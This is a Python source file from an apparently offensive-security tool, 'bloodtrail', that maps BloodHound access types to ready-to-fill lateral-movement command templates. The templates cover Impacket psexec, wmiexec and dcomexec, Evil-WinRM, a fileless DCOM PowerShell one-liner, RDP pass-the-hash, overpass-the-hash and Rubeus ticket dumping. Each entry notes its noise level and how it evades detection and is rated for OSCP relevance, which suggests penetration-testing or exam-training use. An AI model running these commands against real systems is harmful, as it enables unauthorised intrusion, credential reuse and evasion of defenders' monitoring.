"""
Lateral movement technique mappings for bloodtrail.

Technique metadata for AdminTo, CanPSRemote, CanRDP, ExecuteDCOM access types.
"""

from typing import Dict, List, Optional

from .base import TechniqueInfo


# Multiple techniques available for each access type
# Ordered by reliability/common usage (first is default)
LATERAL_TECHNIQUES: Dict[str, List[TechniqueInfo]] = {
    "AdminTo": [
        TechniqueInfo(
            name="PsExec (Impacket)",
            command_templates={
                "password": "impacket-psexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-psexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-psexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[445],
            requirements=["SMB port 445 open", "ADMIN$ share accessible", "Local admin rights"],
            noise_level="high",
            advantages="Reliable, gets SYSTEM shell, works with hash/ticket",
            disadvantages="Creates service, logged in Event Log, AV detection",
            oscp_relevance="high",
        ),
        TechniqueInfo(
            name="WMIExec (Impacket)",
            command_templates={
                "password": "impacket-wmiexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-wmiexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-wmiexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[135],
            requirements=["RPC port 135 open", "WMI access", "Local admin rights"],
            noise_level="medium",
            advantages="No service creation, runs as user, uses WMI (legitimate)",
            disadvantages="No SYSTEM shell, requires RPC, slower than PsExec",
            oscp_relevance="high",
        ),
        TechniqueInfo(
            name="SMBExec (Impacket)",
            command_templates={
                "password": "impacket-smbexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-smbexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-smbexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[445],
            requirements=["SMB port 445 open", "ADMIN$ share accessible", "Local admin rights"],
            noise_level="high",
            advantages="SYSTEM shell, creates fewer artifacts than PsExec",
            disadvantages="Service creation, Event Log entries, AV detection",
            oscp_relevance="medium",
        ),
        TechniqueInfo(
            name="DCOMExec (Impacket)",
            command_templates={
                "password": "impacket-dcomexec -object MMC20 '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-dcomexec -object MMC20 -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-dcomexec -object MMC20 -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[135],
            requirements=["RPC port 135 open", "DCOM enabled", "Local admin rights"],
            noise_level="medium",
            advantages="Uses DCOM (often overlooked), runs as user",
            disadvantages="Requires RPC, less reliable than PsExec/WMI",
            oscp_relevance="medium",
        ),
        TechniqueInfo(
            name="Evil-WinRM",
            command_templates={
                "password": "evil-winrm -i <TARGET> -u <USERNAME> -p '<CRED_VALUE>'",
                "ntlm-hash": "evil-winrm -i <TARGET> -u <USERNAME> -H <CRED_VALUE>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> evil-winrm -i <TARGET> -r <DOMAIN>",
            },
            ports=[5985, 5986],
            requirements=["WinRM port 5985/5986 open", "Local admin rights"],
            noise_level="low",
            advantages="Interactive PowerShell, file upload/download, stealthy, great for post-exploitation",
            disadvantages="Requires WinRM enabled, may need firewall exception",
            oscp_relevance="high",
        ),
        TechniqueInfo(
            name="DCOM MMC20 (PowerShell)",
            command_templates={
                "password": "$dcom=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','<TARGET>')); $dcom.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c <COMMAND>','7')",
            },
            ports=[135],
            requirements=["RPC port 135 open", "Must run FROM compromised Windows host", "Local admin on target"],
            noise_level="low",
            advantages="Fileless, native PowerShell, no tools needed, often bypasses detection",
            disadvantages="Requires compromised Windows host to run from, no interactive shell",
            oscp_relevance="high",
        ),
    ],
    "CanPSRemote": [
        TechniqueInfo(
            name="Evil-WinRM",
            command_templates={
                "password": "evil-winrm -i <TARGET> -u <USERNAME> -p '<CRED_VALUE>'",
                "ntlm-hash": "evil-winrm -i <TARGET> -u <USERNAME> -H <CRED_VALUE>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> evil-winrm -i <TARGET> -r <DOMAIN>",
            },
            ports=[5985, 5986],
            requirements=["WinRM port 5985/5986 open", "Remote Management Users group"],
            noise_level="low",
            advantages="Interactive PowerShell, file upload/download, stealthy",
            disadvantages="Requires WinRM, may need Remote Management Users membership",
            oscp_relevance="high",
        ),
        TechniqueInfo(
            name="WinRS (Windows)",
            command_templates={
                "password": "winrs -r:<TARGET> -u:<DOMAIN>\\<USERNAME> -p:<CRED_VALUE> cmd",
            },
            ports=[5985, 5986],
            requirements=["WinRM port 5985/5986 open", "Windows client", "Remote Management Users group"],
            noise_level="low",
            advantages="Native Windows, no extra tools, trusted binary",
            disadvantages="Windows-only, less interactive than Evil-WinRM",
            oscp_relevance="medium",
        ),
    ],
    "CanRDP": [
        TechniqueInfo(
            name="xfreerdp",
            command_templates={
                "password": "xfreerdp /v:<TARGET> /u:<USERNAME> /p:'<CRED_VALUE>' /d:<DOMAIN> +clipboard",
                "ntlm-hash": "xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<CRED_VALUE> /d:<DOMAIN> +clipboard",
            },
            ports=[3389],
            requirements=["RDP port 3389 open", "Remote Desktop Users or Administrators group"],
            noise_level="low",
            advantages="Full GUI access, file transfer, clipboard sharing",
            disadvantages="Visible session (noisy), may disconnect other users",
            oscp_relevance="high",
        ),
        TechniqueInfo(
            name="rdesktop",
            command_templates={
                "password": "rdesktop -u <USERNAME> -p '<CRED_VALUE>' -d <DOMAIN> <TARGET>",
            },
            ports=[3389],
            requirements=["RDP port 3389 open", "Remote Desktop Users or Administrators group"],
            noise_level="low",
            advantages="Lightweight, works on older systems",
            disadvantages="Fewer features than xfreerdp, password only",
            oscp_relevance="low",
        ),
    ],
    "ExecuteDCOM": [
        TechniqueInfo(
            name="DCOMExec (MMC20)",
            command_templates={
                "password": "impacket-dcomexec -object MMC20 '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-dcomexec -object MMC20 -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-dcomexec -object MMC20 -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[135],
            requirements=["RPC port 135 open", "DCOM enabled", "Local admin or DCOM permission"],
            noise_level="medium",
            advantages="Uses MMC20 Application COM object, often overlooked",
            disadvantages="Requires RPC, may be blocked by firewall",
            oscp_relevance="medium",
        ),
    ],
}


# When user has NTLM hash but target requires Kerberos authentication
# Converts NTLM hash to Kerberos TGT for environments blocking NTLM
CREDENTIAL_CONVERSION: Dict[str, TechniqueInfo] = {
    "overpass-the-hash": TechniqueInfo(
        name="Overpass the Hash (NTLM -> TGT)",
        command_templates={
            "ntlm-hash": "impacket-getTGT -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'",
        },
        ports=[88],
        requirements=["Kerberos port 88 reachable", "Valid NTLM hash", "User account not disabled"],
        noise_level="low",
        advantages="Converts hash to TGT for Kerberos-only targets, evades NTLM monitoring",
        disadvantages="Requires Kerberos access, TGT expires (10h default)",
        oscp_relevance="high",
    ),
}


# Using/importing Kerberos tickets for authentication
TICKET_ATTACKS: Dict[str, TechniqueInfo] = {
    "export-tickets": TechniqueInfo(
        name="Export Kerberos Tickets (Rubeus)",
        command_templates={
            # Windows - run on compromised host with session
            "session": "Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap",
        },
        ports=[],
        requirements=["Local admin on host with target session", "Target logged in"],
        noise_level="medium",
        advantages="Extract tickets for offline use, enables pass-the-ticket",
        disadvantages="Requires session on target, may trigger EDR",
        oscp_relevance="high",
    ),
    "pass-the-ticket": TechniqueInfo(
        name="Pass the Ticket (ccache)",
        command_templates={
            "kerberos-ticket": "export KRB5CCNAME=<CRED_VALUE>",
        },
        ports=[88],
        requirements=["Valid ccache file", "Ticket not expired", "Matching SPN"],
        noise_level="low",
        advantages="Reuse captured tickets, no hash needed, avoids password cracking",
        disadvantages="Tickets expire, need correct service ticket",
        oscp_relevance="high",
    ),
    "convert-kirbi-ccache": TechniqueInfo(
        name="Convert .kirbi to .ccache",
        command_templates={
            "kirbi-file": "impacket-ticketConverter <CRED_VALUE> <OUTPUT>.ccache",
        },
        ports=[],
        requirements=["Valid .kirbi file from Rubeus/Mimikatz"],
        noise_level="low",
        advantages="Convert Windows tickets to Linux format",
        disadvantages="Requires initial ticket extraction",
        oscp_relevance="medium",
    ),
}


def get_techniques_for_access(access_type: str) -> List[TechniqueInfo]:
    """
    Get all available lateral movement techniques for an access type.

    Args:
        access_type: BloodHound edge type (AdminTo, CanPSRemote, etc.)

    Returns:
        List of TechniqueInfo objects, ordered by reliability
    """
    return LATERAL_TECHNIQUES.get(access_type, [])


def get_technique_command(
    access_type: str,
    cred_type: str,
    technique_index: int = 0
) -> Optional[str]:
    """
    Get command template for a specific technique and credential type.

    Args:
        access_type: BloodHound edge type
        cred_type: password, ntlm-hash, kerberos-ticket
        technique_index: Which technique to use (0 = default/first)

    Returns:
        Command template string or None
    """
    techniques = LATERAL_TECHNIQUES.get(access_type, [])
    if not techniques or technique_index >= len(techniques):
        return None
    return techniques[technique_index].command_templates.get(cred_type)


def needs_overpass_the_hash(cred_type: str, target_ports: List[int]) -> bool:
    """
    Determine if Overpass the Hash is needed.

    Needed when:
    - User has NTLM hash
    - Target only accepts Kerberos (port 88 open, 445 closed)

    Args:
        cred_type: Current credential type
        target_ports: List of open ports on target

    Returns:
        True if Overpass the Hash should be suggested
    """
    if cred_type != "ntlm-hash":
        return False
    # If SMB is blocked but Kerberos is available
    return 88 in target_ports and 445 not in target_ports
